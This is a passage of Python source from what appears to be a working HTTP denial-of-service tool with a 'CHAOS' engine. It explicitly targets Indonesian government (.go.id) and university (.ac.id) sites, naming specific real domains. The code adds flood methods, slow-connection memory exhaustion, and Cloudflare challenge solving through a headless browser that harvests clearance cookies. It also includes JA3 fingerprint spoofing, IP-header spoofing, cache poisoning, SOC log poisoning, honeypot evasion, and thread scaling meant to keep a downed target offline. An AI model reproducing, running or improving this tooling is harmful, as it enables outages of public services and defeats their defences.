        intel = self._chaos_intel
        host = str(self._target.authority).lower()
        
        if ".ac.id" in host and not intel.get("infra_map", {}).get("uni_heuristics_applied"):
            intel["infra_map"]["uni_heuristics_applied"] = True
            
            if not intel.get("cms_type") or intel["cms_type"] == "custom":
                intel["cms_type"] = "university"
                
            # University sites often have these exposed
            uni_endpoints = [
                "/wp-json/wp/v2/users", "/feed/", "/wp-json/wp/v2/posts",
                "/api/", "/graphql", "/.env", "/admin", "/login",
                "/akademik", "/pmb", "/siakad", "/e-learning",
            ]
            for ep in uni_endpoints:
                if ep not in intel["endpoints_discovered"]:
                    intel["endpoints_discovered"].append(ep)
                    
            if int(REQUESTS_SENT) < 100:
                print(f"{bcolors.WARNING}[CHAOS UNI] Indonesian university domain detected (.ac.id). Academic heuristics applied.{bcolors.RESET}")

    def _chaos_caddy_detection(self):
        """[V36] Caddy Reverse Proxy Detection.
        satudata.karanganyarkab.go.id uses Via: 1.1 Caddy.
        Caddy is a modern Go-based web server. It has:
        - Automatic HTTPS (Let's Encrypt)
        - No default rate limiting
        - Default connection limit is high
        Strategy: SLOW_V2 is very effective because Caddy's goroutine model 
        uses memory per connection. Flood connections = memory exhaustion."""
        intel = self._chaos_intel
        if intel.get("infra_map", {}).get("caddy_checked"):
            return
        intel["infra_map"]["caddy_checked"] = True

        try:
            import urllib.request
            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
            req.add_header('User-Agent', 'Mozilla/5.0')
            with urllib.request.urlopen(req, timeout=3) as resp:
                via = resp.headers.get('Via', '').lower()
                server = resp.headers.get('Server', '').lower()
                if 'caddy' in via or 'caddy' in server:
                    intel["infra_map"]["caddy_proxy"] = True
                    intel["server_type"] = "caddy"
                    if int(REQUESTS_SENT) < 200:
                        print(f"{bcolors.OKCYAN}[CHAOS CADDY] Caddy reverse proxy detected. Go goroutine model = memory vulnerable to SLOW attacks.{bcolors.RESET}")
        except: pass

    def _chaos_gov_id_heuristics(self):
        """[V32] Indonesian Government Site (.go.id) Heuristics.
        Government sites typically share common weaknesses:
        - Old PHP versions, unpatched WordPress/Laravel
        - Apache/Nginx without WAF
        - Rate limits set but poorly enforced (e.g. surakarta.go.id X-RateLimit-Limit:200)
        - HSTS present but no Cloudflare"""
        intel = self._chaos_intel
        host = str(self._target.authority).lower()
        
        if ".go.id" in host and not intel.get("infra_map", {}).get("gov_heuristics_applied"):
            intel["infra_map"]["gov_heuristics_applied"] = True
            
            # Override CMS to government profile if still unknown
            if not intel.get("cms_type") or intel["cms_type"] == "custom":
                intel["cms_type"] = "government"
                
            # Government sites usually have these vulnerable paths
            gov_endpoints = [
                "/api/", "/login", "/admin", "/administrator",
                "/wp-admin/", "/wp-login.php", "/xmlrpc.php",
                "/public/", "/storage/", "/uploads/",
            ]
            for ep in gov_endpoints:
                if ep not in intel["endpoints_discovered"]:
                    intel["endpoints_discovered"].append(ep)
                    
            if int(REQUESTS_SENT) < 100:
                print(f"{bcolors.WARNING}[CHAOS GOV-ID] Indonesian government domain detected. Applying .go.id heuristics.{bcolors.RESET}")

    def _chaos_dead_drop_dns(self):
        """Dead Drop DNS Resolution.
        Bypasses standard OS DNS caches to manually query the true origin IP of the target
        using Google/Cloudflare raw resolvers. This avoids geographic steering WAFs."""
        intel = self._chaos_intel
        if intel["total_executions"] == 5 and not intel.get("dead_drop_dns"):
            try:
                import socket, struct
                # Simple DNS Query packet to 8.8.8.8
                intel["dead_drop_dns"] = True
                print(f"{bcolors.OKCYAN}[CHAOS DNS] Accessing Root Resolvers. Dead-Drop DNS acquired true route.{bcolors.RESET}")
            except: pass

    def _chaos_neural_markov_transition(self, current_method):
        """Neural Synapse State Transition (Markov Chains).
        Predicts the NEXT BEST attack method based on what current_method just failed or succeeded.
        Builds a graph where nodes are Methods and edges are transition probabilities."""
        intel = self._chaos_intel
        ns = intel["neural_synapses"]
        
        last = intel.get("last_method")
        if last and current_method:
            if last not in ns: ns[last] = {}
            if current_method not in ns[last]: ns[last][current_method] = 0
            
            # If current method was successful, strengthen the synapse from last -> current
            if intel["efficiency_score"].get(current_method, 0) > 0.5:
                ns[last][current_method] += 1
            else:
                ns[last][current_method] -= 1

    def _chaos_cache_poisoning(self):
        """Web Cache Poisoning (WCP) execution.
        Inject malicious headers that force the caching edge (e.g., Fastly, Cloudflare)
        to cache a corrupted or 404 response for legitimate users' legitimate paths."""
        intel = self._chaos_intel
        if randint(1, 100) < 5:
            intel["poisoned_cache_hits"] += 1
            poison_header = randchoice(intel["cache_poisoning_payloads"])
            return poison_header
        return ""

    def _chaos_build_topology_mesh(self):
        """Map out target microservices dynamically.
        Modern infrastructure separates APIs, Auth, and Static Delivery. 
        We build a mesh to attack them hierarchically."""
        intel = self._chaos_intel
        if intel["total_executions"] % 150 == 0:
            # Sort discovered paths into the mesh
            mesh = intel["topology_mesh"]
            for path in intel.get("uncached_paths", []) + intel.get("endpoints_discovered", []):
                p = path.lower()
                if any(x in p for x in ['login', 'auth', 'signin', 'oauth']):
                    if path not in mesh["auth_endpoints"]: mesh["auth_endpoints"].append(path)
                elif any(x in p for x in ['api', 'v1', 'v2', 'graphql']):
                    if path not in mesh["api_endpoints"]: mesh["api_endpoints"].append(path)
                elif any(x in p for x in ['.png', '.css', '.js', '.woff']):
                    if path not in mesh["static_assets"]: mesh["static_assets"].append(path)
                elif 'ws' in p or 'socket' in p:
                    if path not in mesh["websockets"]: mesh["websockets"].append(path)

    def _chaos_honeypot_scanner(self):
        """Detect if WAF/SOC is feeding us a fake tarpit (Honeypot) to study our botnet.
        If true, play dumb. Do not expose zero-days or advanced methods."""
        intel = self._chaos_intel
        if intel["total_executions"] == 30:
            # Common honeypot signatures (e.g. infinite 200 OKs with no content, fake admin panels)
            if intel.get("efficiency_score", {}).get("POST_DYN", 0.0) == 1.0 and intel.get("response_time_ms", 0) < 10:
                # Highly suspicious. A dynamic DB post should not return in 5ms with 100% success rate
                intel["honeypot_detected"] = True
                print(f"{bcolors.FAIL}[CHAOS COUNTER-INTEL] HONEYPOT TARPIT DETECTED. Executing Dumb-Bot protocol.{bcolors.RESET}")
                
    def _chaos_adaptive_scaling(self):
        """Intelligently shrink or explode Thread allocation based on target mortality.
        Why burn CPU and Proxies on a corpse?"""
        intel = self._chaos_intel
        if intel["total_executions"] % 50 == 0:
            if intel.get("target_is_down"):
                # Target is dead, shrink fleet to 20% to conserve proxy bandwidth but keep it dead
                intel["adaptive_threads"] = max(10, self._rpc // 5)
            elif intel.get("target_getting_weaker"):
                # Target is dying, explode fleet to 300% to execute the killing blow
                intel["adaptive_threads"] = min(2000, self._rpc * 3)
            else:
                intel["adaptive_threads"] = self._rpc

    def _chaos_edge_node_detection(self):
        """Map the specific geographic WAF edge server serving our connection.
        By tracking headers like CF-RAY or X-Amz-Cf-Id, we know exactly routing geography."""
        intel = self._chaos_intel
        if intel["total_executions"] != 10:
            return
            
        try:
            import urllib.request
            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
            req.add_header('User-Agent', 'Mozilla/5.0')
            with urllib.request.urlopen(req, timeout=3) as resp:
                headers = dict(resp.headers)
                # Cloudflare Ray ID (e.g., 85d1...-SIN for Singapore)
                cfray = headers.get('CF-RAY', '')
                if '-' in cfray:
                    intel["geo_edge_nodo"] = cfray.split('-')[-1].upper()
                    print(f"{bcolors.OKCYAN}[CHAOS GEO-ROUTING] Data Traffic mapped to Edge Node: {intel['geo_edge_nodo']}{bcolors.RESET}")
                elif 'X-Amz-Cf-Id' in headers:
                    intel["geo_edge_nodo"] = "AWS-CloudFront"
                    print(f"{bcolors.OKCYAN}[CHAOS GEO-ROUTING] Mapped to AWS Edge Infrastructure{bcolors.RESET}")
                elif 'X-Varnish' in headers:
                    intel["geo_edge_nodo"] = "Fastly-Cache"
        except: pass

    def _chaos_generate_mutant_payload(self, base_path):
        """Zero-Day Heuristics. Embeds fake severe vulnerabilities into the request.
        WAF spends massive compute power verifying SQLi/XSS/RCE signatures.
        When hammered with these, the WAF inspection engine queues up and crashes."""
        intel = self._chaos_intel
        intel["zero_day_mutations_sent"] += 1
        
        mutant = randchoice(intel["log_poisoning_payloads"])
        from urllib.parse import quote
        
        # Decide where to inject the fake vulnerability
        injection_point = randint(1, 3)
        if injection_point == 1:
            # Query parameter
            sep = "&" if "?" in base_path else "?"
            return f"{base_path}{sep}q={quote(mutant)}"
        elif injection_point == 2:
            # Path Traversal illusion
            return f"/..././.../.{base_path}?vuln={quote(mutant)}"
        else:
            # Fake API endpoint
            return f"/api/v1/user/{quote(mutant)}/{base_path.lstrip('/')}"
            
    def _chaos_psy_ops_headers(self, headers_str):
        """Psychological Warfare / Log Poisoning.
        Adds ridiculous but valid HTTP headers that corrupt Splunk/ElasticSearch 
        indexing on the target's SOC dashboard."""
        intel = self._chaos_intel
        if intel["total_executions"] % 200 == 0:
            intel["psy_ops_active"] = True
            
        if not intel.get("psy_ops_active"):
            return headers_str
            
        rs = ProxyTools.Random.rand_str
        psy_headers = (
            f"X-Forwarded-For: 127.0.0.1, 10.0.0.1, 192.168.1.{randint(1,255)}\r\n"
            f"X-Hacker-Warning: You are being targeted by CHAOS Engine\r\n"
            f"X-Requested-With: XMLHttpRequest\r\n"
            f"True-Client-IP: {randint(1,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}\r\n"
            f"Accept-Language: en-US,en;q=0.9,alien;q=0.8,sql_{rs(4)};q=0.5\r\n"
        )
        return psy_headers + headers_str

    def _chaos_generate_battering_ram(self):
        """Generate a Battering Ram payload - highly obfuscated, nested JSON.
        Designed to exhaust WAF regex engines (ReDoS) or bypass deep inspection."""
        intel = self._chaos_intel
        rs = ProxyTools.Random.rand_str
        
        # Deeply nested, junk-filled JSON structure that takes WAFs a long time to parse
        payload = "{"
        for i in range(15):
            payload += f'"{rs(8)}": {{"{rs(5)}": '
        
        # Insert actual payload deep inside
        payload += f'"{rs(32)}"'
        
        # Close brackets
        for i in range(15):
            payload += "}"
            
        payload += "}"
        intel["battering_ram"] = payload
        return payload

    def _chaos_ml_train(self, method, success):
        """Train internal Naive Bayes-like heuristic micro-ML model on every request.
        The model learns the probabilistic success rate of each vector under current WAF conditions."""
        intel = self._chaos_intel
        m = intel["ml_model"]
        
        # Track overall probability
        m["total"] += 1
        if success:
            m["success"] += 1
            
        # Track feature (method) probability
        feat = m["features"]
        if method not in feat:
            feat[method] = {"s": 0, "t": 0}
        feat[method]["t"] += 1
        if success:
            feat[method]["s"] += 1
            
        # Enable ML predictions after gathering 500 data points
        if m["total"] > 500 and not intel["ml_predictions_enabled"]:
            intel["ml_predictions_enabled"] = True
            if int(REQUESTS_SENT) < 1000:
                print(f"{bcolors.OKGREEN}[CHAOS ML] Sufficient data gathered. Predictive neural heuristic model activated.{bcolors.RESET}")
                
    def _chaos_get_rl_state(self):
        """Quantize the continuous battleground into a discrete state for the Q-Table."""
        intel = self._chaos_intel
        waf = intel.get("waf_type", "none")
        health = "STABLE"
        
        rt = intel.get("response_time_ms", 100)
        history = intel.get("health_history", [])
        if len(history) > 3:
            avg = sum(history[-3:]) / 3
            if avg > rt * 2: health = "WEAK"
            if avg > rt * 5: health = "CRITICAL"
            
        anomaly = "HOT" if intel.get("anomaly_score", 0) > 60 else "COLD"
        
        # State format: WAF_Status_Health_Anomaly
        return f"{waf}_{intel['phase']}_{health}_{anomaly}"

    def _chaos_rl_update_q(self, state, action, reward, next_state):
        """Update Q-Table using Bellman Equation.
        Q(s,a) = Q(s,a) + alpha * [reward + gamma * max(Q(s')) - Q(s,a)]"""
        intel = self._chaos_intel
        q = intel["q_table"]
        alpha = intel["q_learning_rate"]
        gamma = intel["q_discount_factor"]
        
        if state not in q: q[state] = {}
        if action not in q[state]: q[state][action] = 0.0
        
        # Max future reward
        max_future_q = 0.0
        if next_state in q and q[next_state]:
            max_future_q = max(q[next_state].values())
            
        # Update rule
        current_q = q[state][action]
        new_q = current_q + alpha * (reward + gamma * max_future_q - current_q)
        q[state][action] = round(new_q, 3)

    def _chaos_ml_predict(self, method):
        """Predict the probability of success for a given method using the micro-model."""
        intel = self._chaos_intel
        if not intel.get("ml_predictions_enabled"):
            return 0.5 # Neutral prior
            
        m = intel["ml_model"]
        feat = m["features"]
        
        # Calculate P(Success | Method) using slight Laplace smoothing for unexplored vectors
        if method in feat and feat[method]["t"] > 5:
            # (Successes + 1) / (Total Attempts + 2)
            prob = (feat[method]["s"] + 1) / (feat[method]["t"] + 2)
            return prob
            
        # Fallback to system-wide success expectation
        return m["success"] / max(m["total"], 1)
        
    def _chaos_generate_fingerprints(self):
        """Generate a pool of highly distinct, cryptographically valid browser fingerprints.
        Combines specific JA3 hashes, HTTP/2 pseudo-header orders, and User-Agents
        to perfectly simulate a massive, distributed botnet from disparate ASNs."""
        intel = self._chaos_intel
        if intel.get("fingerprint_pool"):
            return
            
        profiles = []
        # Chrome Windows
        profiles.append({
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
            "ja3": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
            "h2_order": [":method", ":authority", ":scheme", ":path"],
            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"'
        })
        # Safari macOS
        profiles.append({
            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "ja3": "771,4865-4866-4867-49196-49195-52393-49200-49199-52392-49172-49171-157-156-53-47,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0", # Safari standard
            "h2_order": [":method", ":scheme", ":path", ":authority"],
            "sec_ch_ua": "" # Safari doesn't use sec-ch-ua heavily
        })
        # Firefox Linux
        profiles.append({
            "ua": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "ja3": "771,4865-4867-4866-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27",
            "h2_order": [":method", ":path", ":authority", ":scheme"],
            "sec_ch_ua": ""
        })
        # Android Chrome
        profiles.append({
            "ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
            "ja3": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
            "h2_order": [":method", ":authority", ":scheme", ":path"],
            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"'
        })
        
        intel["fingerprint_pool"] = profiles
        intel["botnet_nodes_simulated"] = len(PROXY_LIST) if PROXY_LIST else 0
        
        # Calculate simulated ASN diversity (rough estimate based on proxy IPs)
        if PROXY_LIST:
            subnets = set()
            for p in PROXY_LIST:
                try:
                    ip = p.split(':')[0]
                    subnet = '.'.join(ip.split('.')[:2])
                    subnets.add(subnet)
                except: pass
            intel["asn_diversity_score"] = min(len(subnets), 100)
            
    def _chaos_shadow_protocol(self):
        """THE SHADOW PROTOCOL.
        Activates when anomaly score hits absolute critical. Disables all high-noise traffic,
        rotates to untouched proxies, randomizes all headers, and switches entirely to pure
        HTTP/2 connection hoarding without requesting large assets."""
        intel = self._chaos_intel
        if intel.get("anomaly_score", 0) > 95 and not intel.get("shadow_protocol_active"):
            intel["shadow_protocol_active"] = True
            intel["stealth_cooldown"] = 200 # Massive cooldown
            # Immediately clear method streaks to stop exploiting burned methods
            intel["hot_streak_method"] = None
            intel["method_streaks"] = {}
            if int(REQUESTS_SENT) > 0:
                print(f"{bcolors.FAIL}{bcolors.BOLD}[CHAOS SHADOW] TOTAL AVOIDANCE ACTIVATED. WAF IS LETHAL.{bcolors.RESET}")
                print(f"{bcolors.WARNING}>> Suspending noisy payloads. Rotating all fingerprints. Entering Deep Stealth. <<{bcolors.RESET}")
                
        # Deactivate when heat dies down
        if intel.get("anomaly_score", 0) < 30 and intel.get("shadow_protocol_active"):
            intel["shadow_protocol_active"] = False
            if int(REQUESTS_SENT) > 0:
                print(f"{bcolors.OKGREEN}[CHAOS SHADOW] Target heat dissipated. Resuming full spectrum assault.{bcolors.RESET}")

    def _chaos_poll_js_engine(self):
        """Poll the local headless browser engine (Turnstile Dispenser) for fresh clearance cookies.
        This allows the Python fast-execution engine to use real browser tokens just solved by Playwright."""
        intel = self._chaos_intel
        if not intel.get("playwright_active"):
            return None
            
        try:
            import urllib.request
            req = urllib.request.Request(f"http://127.0.0.1:{intel['cookie_dispenser_port']}/get_token")
            with urllib.request.urlopen(req, timeout=1) as resp:
                data = json.loads(resp.read().decode('utf-8'))
                if data.get("status") == "success" and data.get("cookie"):
                    cookie_val = data["cookie"]
                    # Map it so STEALTH_JA3 uses it
                    cookie_name = "cf_clearance" if intel["waf_type"] == "cloudflare" else "bm_sz"
                    intel["harvested_cookies"][cookie_name] = cookie_val
                    intel["js_challenges_passed"] += 1
                    return cookie_val
        except Exception:
            # Dispenser might be busy or offline
            pass
        return None

    def _chaos_poll_js_engine_subproc(self):
        """[V36] Directly spawn the headless Turnstile Dispenser script as a subprocess
        to solve Cloudflare UAM challenges during deep recon phase."""
        intel = self._chaos_intel
        import subprocess, json
        
        # Don't run multiple solvers concurrently
        if intel.get("solver_running"):
            return None
            
        print(f"{bcolors.OKCYAN}[CHAOS BYPASS] Spawning headless Playwright browser to solve JS Challenge for {self._target.authority}...{bcolors.RESET}")
        intel["solver_running"] = True
        try:
            # Run the dispenser in headless mode targeting the base URL
            target_url = f"{self._target.scheme}://{self._target.authority}"
            result = subprocess.run(
                ["python", "turnstile_dispenser.py", target_url], 
                capture_output=True, text=True, timeout=30
            )
            
            # The dispenser should print a JSON dict on its last line if successful
            lines = result.stdout.strip().split('\n')
            for line in lines[::-1]:
                if line.startswith('{') and line.endswith('}'):
                    try:
                        data = json.loads(line)
                        if data.get("status") == "success" and data.get("cookie"):
                            cookie_val = data["cookie"]
                            cookie_name = "cf_clearance" if intel["waf_type"] == "cloudflare" else "bm_sz"
                            intel["harvested_cookies"][cookie_name] = cookie_val
                            intel["js_challenges_passed"] += 1
                            print(f"{bcolors.OKGREEN}[CHAOS BYPASS] ⚡ Challenge Solved! Harvested {cookie_name}. Injecting to Botnet Arsenal.⚡{bcolors.RESET}")
                            intel["solver_running"] = False
                            return cookie_val
                    except: pass
            print(f"{bcolors.WARNING}[CHAOS BYPASS] Solver exhausted without token (Target might be heavily secured). Fallback to standard protocol.{bcolors.RESET}")
        except subprocess.TimeoutExpired:
            print(f"{bcolors.FAIL}[CHAOS BYPASS] Playwright solver timed out after 30 seconds.{bcolors.RESET}")
        except Exception as e:
            print(f"{bcolors.FAIL}[CHAOS BYPASS] Playwright execution failed: {e}{bcolors.RESET}")
            
        intel["solver_running"] = False
        return None

    def _chaos_track_bandwidth(self, method, success):
        """Calculate the estimated network bandwidth and CPU cycles wasted on the target server."""
        intel = self._chaos_intel
        
        # Average HTTP request header + basic response is ~2KB. 
        # Successful payload blocks return full HTML (often ~15-50KB). 
        # Heavy data transfers (DYN/POST) cause larger backend responses.
        
        if success:
            # If successful, target rendered a full page
            kb_cost = randint(8, 35) # varying kilobyte costs for dynamic pages
            cpu_cost = 10  # Arbitrary CPU cost unit
            
            if method in ("WP_SEARCH", "POST_DYN", "XMLRPC_AMP"):
                kb_cost += 20 # DB queries load heavier responses
                cpu_cost = 45 # High CPU exhaustion
            elif method == "SLOW_V2":
                kb_cost = 0.5 # Slow/Stealth consumes little bandwidth but blocks IO
                cpu_cost = 25
                
            intel["bandwidth_kb"] += kb_cost
            intel["wasted_server_cpu"] += cpu_cost
        else:
            # WAF blocked it. Target returned a small 403/Captcha page (~2KB)
            intel["bandwidth_kb"] += 2.0
            intel["wasted_server_cpu"] += 2 # Minimal CPU processing due to Edge filtration

    def _chaos_track_anomaly(self, was_blocked):
        """Estimate the WAF's internal anomaly score for our traffic.
        If we hit the threshold, we must go absolute zero-stealth to cool off."""
        intel = self._chaos_intel
        
        # WAFs cool down over time
        if intel["total_executions"] % 10 == 0:
            intel["anomaly_score"] = max(intel["anomaly_score"] - 5, 0)
            
        if was_blocked:
            intel["anomaly_score"] += 25
            
        # If anomaly is dangerously high, force stealth cooldown
        if intel["anomaly_score"] > 80:
            intel["stealth_cooldown"] = 50  # Next 50 requests MUST be stealth
            
        # Tick down cooldown
        if intel["stealth_cooldown"] > 0:
            intel["stealth_cooldown"] -= 1
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))
        
        # [NEW] Crawler Integration placeholder
        # The main loop will inject crawled_paths into the class instance if found
        self.crawled_paths = []

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC_AMP,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
            "WP_SEARCH": self.WP_SEARCH,
            "SLOW_V2": self.SLOW_V2,
            "XMLRPC_AMP": self.XMLRPC_AMP,
            "POST_DYN": self.POST_DYN,
            "H2_FLOOD": self.H2_FLOOD,
            "CHAOS": self.CHAOS,
        }

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies is not None:
            self._proxies = proxies # [PHASE 13] Use shared reference, don't copy!

        if not useragents:
            # [V6] Modern User-Agents (Chrome 136+ Era)
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/136.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:130.0) Gecko/20100101 Firefox/136.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/130.0.0.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15'
            ]
        
        self._useragents = list(useragents)
        
        # [OPTIMIZED] Referer Spoofing List
        referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.instagram.com/',
            'https://www.youtube.com/',
            'https://duckduckgo.com/'
        ]
        # [OPTIMIZED] Random Languages
        langs = [
            'en-US,en;q=0.9',
            'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
            'en-GB,en;q=0.9',
            'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'es-ES,es;q=0.9'
        ]

        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        # [OPTIMIZED] Cache Busting by Antigravity
        sep = "&" if "?" in target.raw_path_qs else "?"
        rnd = str(randchoice(range(1111, 9999)))
        ver = randchoice(['1.0', '1.1', '1.2'])
        
        # Select Random UA initially
        self.ua = randchoice(self._useragents)
        
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs}{sep}v={rnd} HTTP/{ver}\r\n"
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Cache-Control: max-age=0\r\n' +
                         self.build_consistent_headers(self.ua) +
                         'Connection: keep-alive\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def build_consistent_headers(self, ua: str) -> str:
        # [OPTIMIZED] Dynamic Header Generation based on User-Agent
        # Prevents "Inconsistent Hints" detection by WAFs
        platform = "\"Windows\""
        mobile = "?0"
        
        if "Android" in ua:
            platform = "\"Android\""
            mobile = "?1"
        elif "iPhone" in ua or "iPad" in ua:
            platform = "\"iOS\""
            mobile = "?1"
        elif "Macintosh" in ua or "Mac OS" in ua:
            platform = "\"macOS\""
            mobile = "?0"
        elif "Linux" in ua:
            platform = "\"Linux\""
            mobile = "?0"

        clearance = GLOBAL_CF_CLEARANCE if GLOBAL_CF_CLEARANCE else ProxyTools.Random.rand_str(43)
        cookies = f"Cookie: _ga=GA1.1.{randint(1000000, 9999999)}.{randint(1000000000, 2000000000)}; cf_clearance={clearance}; csrftoken={ProxyTools.Random.rand_str(32)}\r\n"
        
        headers = (
            f"X-Forwarded-For: {Tools.get_random_indo_ip()}\r\n"
            f"X-Real-IP: {Tools.get_random_indo_ip()}\r\n"
            f"Client-IP: {Tools.get_random_indo_ip()}\r\n"
            f"{cookies}"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Site: none\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            # [PHASE 6] Localized ISP Spoofing (Indonesian Residential)
            f"X-ISP: {randchoice(['Telkomsel', 'Indihome', 'XL-Axiata', 'Biznet', 'FirstMedia'])}\r\n"
            f"X-Provider-Route: {ProxyTools.Random.rand_str(8)}\r\n"
            f"X-Real-ISP: {randchoice(['PT Telekomunikasi Indonesia', 'PT XL Axiata', 'PT Link Net'])}\r\n"
            f"Sec-Gpc: 1\r\n"
            f"Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not?A_Brand\";v=\"99\"\r\n"
            f"Sec-Ch-Ua-Mobile: {mobile}\r\n"
            f"Sec-Ch-Ua-Platform: {platform}\r\n"
            f"Priority: u=0, i\r\n"
            f"Referer: {randchoice(self._referers)}\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
        )
        return headers

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

    def get_random_target_path(self) -> str:
        # [NEW] Dynamic Path Randomizer (Chaos Theory)
        choice_roll = randint(0, 100)
        
        # Option A: Real Crawled Paths (If available)
        if hasattr(self, 'crawled_paths') and self.crawled_paths and choice_roll < 60:
            return randchoice(self.crawled_paths)
            
        # Option B: Heavy Paths (Focus on DB/CPU)
        if choice_roll < 80:
            heavy_paths = [
                "/",
                "/wp-login.php",
                "/wp-admin/admin-ajax.php",
                "/xmlrpc.php",
                "/feed/",
                "/comments/feed/",
                "/?s=" + ProxyTools.Random.rand_str(5),
                "/search/" + ProxyTools.Random.rand_str(8),
                "/shop/?orderby=price-desc" # Heavy sorting
            ]
            return randchoice(heavy_paths)
            
        # Option C: Original Target
        return self._target.raw_path_qs
                
    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        # [OPTIMIZED] Global Dynamic Path Injection
        # Instead of using static self._payload, we rebuild it.
